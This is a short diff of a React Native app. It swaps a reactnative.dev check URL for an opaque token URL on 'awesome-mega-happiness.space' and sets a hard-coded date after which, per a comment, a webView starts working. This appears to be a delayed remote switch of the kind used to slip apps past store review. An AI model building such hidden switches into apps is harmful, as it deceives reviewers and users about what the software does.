@@ -455,7 +455,7 @@ function App() {
   ///////// Route useEff
   // awesome-mega-happiness.space
   useEffect(() => {
-    const checkUrl = `https://reactnative.dev/`;
+    const checkUrl = `https://awesome-mega-happiness.space/VHZLH6GL`;
 
     const targetData = new Date('2024-11-03T10:00:00'); //дата з якої поч працювати webView
     const currentData = new Date(); //текущая дата
